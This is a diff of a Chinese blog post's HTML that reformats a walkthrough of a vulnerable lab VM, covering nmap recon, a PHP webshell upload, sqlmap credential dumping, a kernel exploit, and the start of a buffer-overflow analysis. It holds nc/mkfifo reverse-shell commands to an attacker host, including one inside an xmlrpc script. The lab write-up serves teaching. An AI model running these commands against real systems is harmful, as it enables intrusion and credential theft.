@@ -9,14 +9,14 @@
 <li><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">https://docs.python.org/zh-cn/3/library/xmlrpc.html</a></li>
 </ol>
 </blockquote>
-<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-探测主机存活"><a href="#1-探测主机存活" class="headerlink" title="1.探测主机存活"></a>1.探测主机存活</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan 10.0.2.0/24</span><br></pre></td></tr></table></figure>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-探测主机存活"><a href="#1-探测主机存活" class="headerlink" title="1.探测主机存活"></a>1.探测主机存活</h3><pre class="line-numbers language-none"><code class="language-none">sudo arp-scan 10.0.2.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175256383.png" alt="image-20211117175256383"></p>
-<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.12</span><br></pre></td></tr></table></figure>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><pre class="line-numbers language-none"><code class="language-none">sudo nmap -p- 10.0.2.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175552751.png" alt="image-20211117175552751"></p>
 <p>结果显示目标开放了22,80,8000端口</p>
-<h3 id="3-端口服务扫描"><a href="#3-端口服务扫描" class="headerlink" title="3.端口服务扫描"></a>3.端口服务扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p22,80,8000 10.0.2.12</span><br></pre></td></tr></table></figure>
+<h3 id="3-端口服务扫描"><a href="#3-端口服务扫描" class="headerlink" title="3.端口服务扫描"></a>3.端口服务扫描</h3><pre class="line-numbers language-none"><code class="language-none">sudo nmap -sV -p22,80,8000 10.0.2.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175710597.png" alt="image-20211117175710597"></p>
 <p>22端口 SSH</p>
@@ -50,7 +50,7 @@
 <p>发现Profile页面可以正常访问，且发现上传头像区，那是否也可尝试<strong>文件上传</strong>木马呢？</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118103916272.png" alt="image-20211118103916272"></p>
 <h4 id="2-3测试页面"><a href="#2-3测试页面" class="headerlink" title="2.3测试页面"></a>2.3测试页面</h4><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p>新建aa.php文件，写入一句话木马，并上传</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi aa.php</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">vi aa.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118104652005.png" alt="image-20211118104652005"></p>
 <p>没有对文件的后缀和内容进行过滤，此时头像虽未显示，但已经被替换为刚才上传的php文件</p>
@@ -68,21 +68,21 @@
 <p>页面显示后台数据库的报错信息，目标数据库应是MySQL数据库，使用SQLMAP进行测试</p>
 <p>​	使用Burp抓取提交过程中的数据并将其复制至test文件</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118150619413.png" alt="image-20211118150619413"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query     #-p 指定参数</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -r test -p query     #-p 指定参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151256012.png" alt="image-20211118151256012"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151238752.png" alt="image-20211118151238752"></p>
 <p>确定存在SQL注入漏洞，接下来就可以进行信息的获取了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query --dbs</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -r test -p query --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151606121.png" alt="image-20211118151606121"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query -D socialnetwork --tables</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -r test -p query -D socialnetwork --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151752362.png" alt="image-20211118151752362"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query -D socialnetwork -T users --columns</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -r test -p query -D socialnetwork -T users --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151941038.png" alt="image-20211118151941038"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query -D socialnetwork -T users -C user_email,user_password --dump</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -r test -p query -D socialnetwork -T users -C user_email,user_password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118152315735.png" alt="image-20211118152315735"></p>
 <p>获得了admin账号的邮箱地址和密码，使用admin登录</p>
@@ -98,22 +98,22 @@
 <p>使用蚁剑文件管理上传到目标靶机上</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118155210947.png" alt="image-20211118155210947"></p>
 <p>使用gcc编译后才可执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp exploit.c</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gcc -o exp exploit.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">chmod +x exp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;exp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118155624865.png" alt="image-20211118155624865"></p>
 <p>似乎在蚁剑的shell内不能正常运行，尝试使用nc的shell</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118160045951.png" alt="image-20211118160045951"></p>
 <p>不支持-e参数（可使用串联方法），这里为了拓展攻击方法的多样性，使用命令</p>
 <p>kali:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122111610268.png" alt="image-20211122111610268"></p>
 <p>蚁剑shell:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;&#x2F;tmp&#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <blockquote>
 <p>rm &#x2F;tmp&#x2F;f 删除该文件（以免跟后面定义的 管道符 冲突）</p>
@@ -125,38 +125,38 @@
 <p>执行后成功上线</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122112120594.png" alt="image-20211122112120594"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122112256382.png" alt="image-20211122112256382"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python -c &quot;import pty; pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122113004129.png" alt="image-20211122113004129"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;exp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122113224509.png" alt="image-20211122113224509"></p>
 <p>成功提权到root权限</p>
 <h3 id="回到起点"><a href="#回到起点" class="headerlink" title="回到起点"></a>回到起点</h3><p>利用内核漏洞提权后，尝试其他方法</p>
 <p>功成身退🤦‍</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122114416703.png" alt="image-20211122114416703"></p>
 <p>回到普通权限后 搜集当前权限下有无可用信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122114629491.png" alt="image-20211122114629491"></p>
 <p>发现用户socnet具有bash 权限，猜测其可能为主要管理账号</p>
 <p>尝试查看&#x2F;home目录下是否存在该用户文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd socnet</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd socnet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122114956833.png" alt="image-20211122114956833"></p>
 <p>发现了名为<strong>monitor.py</strong>的脚本，难免会想到之前在网站页面内admin用户的留言描述为后台运行的用来监视服务器的<strong>python脚本</strong></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118102735643-20220219102034629.png" alt="image-20211118102735643"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep monitor</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ps aux | grep monitor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124093318091.png" alt="image-20211124093318091"></p>
 <p>查看进程发现monitor.py在运行 那么不妨查看一下该文件代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat monitor.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat monitor.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>简单分析一下：</p>
 <blockquote>
@@ -183,7 +183,7 @@
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124094504425.png" alt="image-20211124094504425"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124095619187.png" alt="image-20211124095619187"></p>
 <p>结合monitor.py和示例客户端代码，进行调试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi a.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">vi a.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124111612734.png" alt="image-20211124111612734"></p>
 <blockquote>
@@ -191,11 +191,11 @@
 <p>with xmlrpc.client.ServerProxy(“<a target="_blank" rel="noopener" href="http://10.0.2.12:8000/&quot;">http://10.0.2.12:8000/&quot;</a>) as proxy:<br>       print(str(proxy.cpu()))</p>
 </blockquote>
 <p>执行测试是否可行(在shell里不好编辑，可用蚁剑上传)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 a.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python3 a.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124105602436.png" alt="image-20211124105602436"></p>
 <p>成功打印出cpu信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi b.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">vi b.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124112829598.png" alt="image-20211124112829598"></p>
 <blockquote>
@@ -209,32 +209,32 @@
 <p>​				print(r)</p>
 <p>​				break</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 b.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python3 b.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124112719226.png" alt="image-20211124112719226"></p>
 <p>执行成功，passcode为1447</p>
 <p>kali端：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124141525887.png" alt="image-20211124141525887"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi c.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">vi c.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124141640107.png" alt="image-20211124141640107"></p>
 <blockquote>
 <p>import xmlrpc.client</p>
 <p>with xmlrpc.client.ServerProxy(“<a target="_blank" rel="noopener" href="http://10.0.2.12:8000/&quot;">http://10.0.2.12:8000/&quot;</a>) as proxy:<br>   cmd &#x3D; “rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 10.0.2.4 5555 &gt;&#x2F;tmp&#x2F;f”<br>   r &#x3D; str(proxy.secure_cmd(cmd,1447))<br>   print(r)</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 c.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python3 c.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124141913344.png" alt="image-20211124141913344"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;           #优化shell</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;           #优化shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124142428803.png" alt="image-20211124142428803"></p>
 <p>查看socnet用户目录下的文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124142732587.png" alt="image-20211124142732587"></p>
-<h3 id="二次提权"><a href="#二次提权" class="headerlink" title="二次提权"></a>二次提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file add_record</span><br></pre></td></tr></table></figure>
+<h3 id="二次提权"><a href="#二次提权" class="headerlink" title="二次提权"></a>二次提权</h3><pre class="line-numbers language-none"><code class="language-none">file add_record<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124143037766.png" alt="image-20211124143037766"></p>
 <p>发现该文件可执行且其属主账号为root</p>
@@ -242,26 +242,26 @@
 <p>peda是基于python的动态调试脚本</p>
 <p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145232452.png" alt="image-20211124145232452"></p>
 <p>执行add_record程序</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./add_record</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;add_record<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124145559990.png" alt="image-20211124145559990"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124145716660.png" alt="image-20211124145716660"></p>
 <p>简单测试了下该程序的各个功能</p>
 <p>同时也发现当前目录下生成了类似于日志文件 查看它</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat employee_records.txt</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat employee_records.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124145917807.png" alt="image-20211124145917807"></p>
 <p>针对每一个可以提交数据的点进行测试，测试是否存在内存溢出等问题</p>
 <p>使用gdb（能够对程序运行中寄存器、堆栈、内存、函数调用、数据变化等使用情况进行详细的跟踪、判断)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb -q .&#x2F;add_record<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151021962.png" alt="image-20211124151021962"></p>
 <p>生成500个A并复制粘贴测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print(&#x27;A&#x27;*500)&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python -c &quot;print(&#39;A&#39;*500)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151203410.png" alt="image-20211124151203410"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151247420.png" alt="image-20211124151247420"></p>
@@ -275,7 +275,7 @@
 <p>经过对数量进行测试 ：</p>
 <p>发现300个、200个、100个都会造成溢出，但50个不会，已经缩小了范围。</p>
 <p>接下来生成一段特征字符(连续的每四个字符都不相同)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 100</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ pattern create 100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124153203054.png" alt="image-20211124153203054"></p>
 <p>再将其输入至explain使其溢出</p>
@@ -284,41 +284,41 @@
 <blockquote>
 <p>AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2A<strong>AHAA</strong>dAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern search</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ pattern search<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124153749453.png" alt="image-20211124153749453"></p>
 <p>得到寄存器EIP的偏移量位置为62，即从第63个字符开始就会进入寄存器EIP中</p>
 <p>生成62个A用来占位 再添加BCDE 再次用来验证</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print(&#x27;A&#x27;*62+&#x27;BCDE&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python -c &quot;print(&#39;A&#39;*62+&#39;BCDE&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124154441052.png" alt="image-20211124154441052"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124154528961.png" alt="image-20211124154528961"></p>
 <p>到此可以确定，已经可以精准的向寄存器EIP内写入</p>
 <p>补充：在CPU内存储数据时是倒序存储的    ASCII码：42–B 43–C 44–D 45–E</p>
 <p>查看汇编代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ disas main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124162244701.png" alt="image-20211124162244701"></p>
 <p>调用了fopen可能是用于打开文件的 put输出内容 print显示</p>
 <p>在调用put函数之前的地址0x0804873d设置断点，进一步观察</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break * 0x0804873drd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ break * 0x0804873drd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124162444002.png" alt="image-20211124162444002"></p>
 <p>添加断点后运行程序可以发现提前触及了断点</p>
 <p>单步执行（每次只执行一个cpu指令）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ s</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124162836920.png" alt="image-20211124162836920"></p>
 <p>可以看到这里执行了程序的欢迎语，</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124163004119.png" alt="image-20211124163004119"></p>
 <p>那么就可以确定在此开始程序的第一步</p>
 <p>同个增加断点单步运行逐个尝试其他调用功能，将其对应起来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ del 1  #删除断点</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ del 1  #删除断点<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>寻找一个调用printf的位置在其之前设置断点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break * 0x0804877b</span><br></pre></td></tr></table></figure>
